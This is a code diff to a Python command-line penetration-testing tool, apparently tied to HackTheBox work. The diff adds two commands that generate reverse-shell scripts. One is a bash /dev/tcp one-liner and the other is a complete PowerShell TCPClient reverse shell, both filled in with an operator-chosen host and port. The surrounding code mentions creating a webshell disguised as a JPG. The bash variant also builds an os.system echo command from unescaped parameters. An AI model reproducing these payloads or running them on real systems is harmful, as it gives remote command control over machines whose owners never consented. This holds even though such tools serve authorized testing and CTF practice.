@@ -958,7 +958,7 @@ hackTheBox: https://app.hackthebox.com/teams/overview/6429
         os.system("python3 modules/lazypwn.py")
 
     def do_fixel(self, line):
-        """LazyLfi2Rce"""
+        """to fix perms"""
         os.system("dos2unix *")
         os.system("dos2unix modules/*")
         os.system("dos2unix modules/cgi-bin/*")
@@ -1063,6 +1063,42 @@ hackTheBox: https://app.hackthebox.com/teams/overview/6429
         print("creando la shell disfrazada de jpg")
         os.system("python3 modules/lazycreate_webshell.py")
         return
+    
+    def do_createrevshell(self, line):
+        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+
+        if not lport or not lhost:
+            print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
+            return
+
+        revshell = f"""
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+"""            
+        print(f"[*] Try... echo '{revshell}' > sessions/revshell.sh ")
+        os.system(f"echo '{revshell}' > sessions/revshell.sh ")
+
+    def do_createwinrevshell(self, line):
+        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        filename = 'sessions/revshell.ps1'
+        if not lport or not lhost:
+            print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
+            return
+
+        revshell = """
+$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+""".replace('{lhost}',lhost).replace('{lport}',str(lport))
+
+        print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 ")
+        
+        with open(filename, 'w') as f:
+            f.write(revshell)
+        f.close()
+        print(f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")
 
     def do_createhash(self, line):
         """Crea un archivo hash.txt en el directorio sessions"""
